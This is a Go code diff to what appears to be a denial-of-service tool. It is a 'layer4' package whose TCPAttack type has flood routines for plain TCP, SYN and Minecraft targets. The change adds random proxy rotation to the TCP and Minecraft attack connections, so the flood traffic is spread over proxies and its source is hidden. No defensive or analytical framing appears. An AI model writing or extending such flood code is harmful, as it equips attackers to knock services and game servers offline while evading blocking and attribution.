@@ -3,6 +3,7 @@ package layer4
 import (
 	"context"
 	"fmt"
+	"math/rand"
 	"net"
 	"strconv"
 	"time"
@@ -45,7 +46,16 @@ func (t *TCPAttack) Attack(ctx context.Context) error {
 }
 
 func (t *TCPAttack) executeTCP(ctx context.Context) error {
-	conn, err := net.DialTimeout("tcp", t.Config.Target, 1*time.Second)
+	var conn net.Conn
+	var err error
+
+	if len(t.Config.Proxies) > 0 {
+		p := t.Config.Proxies[rand.Intn(len(t.Config.Proxies))]
+		conn, err = p.Dial("tcp", t.Config.Target)
+	} else {
+		conn, err = net.DialTimeout("tcp", t.Config.Target, 1*time.Second)
+	}
+
 	if err != nil {
 		return err
 	}
@@ -88,7 +98,16 @@ func (t *TCPAttack) executeSYN(ctx context.Context) error {
 }
 
 func (t *TCPAttack) executeMINECRAFT(ctx context.Context) error {
-	conn, err := net.DialTimeout("tcp", t.Config.Target, 1*time.Second)
+	var conn net.Conn
+	var err error
+
+	if len(t.Config.Proxies) > 0 {
+		p := t.Config.Proxies[rand.Intn(len(t.Config.Proxies))]
+		conn, err = p.Dial("tcp", t.Config.Target)
+	} else {
+		conn, err = net.DialTimeout("tcp", t.Config.Target, 1*time.Second)
+	}
+
 	if err != nil {
 		return err
 	}
